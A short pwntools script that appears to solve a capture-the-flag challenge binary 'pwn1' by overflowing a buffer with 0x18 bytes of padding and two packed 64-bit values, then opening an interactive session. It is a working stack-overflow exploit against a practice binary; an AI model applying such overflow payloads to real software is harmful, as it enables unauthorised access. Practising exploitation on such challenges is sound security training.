from pwn import *

io = process("./pwn1")

io.send('a' * 0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A))
io.interactive()
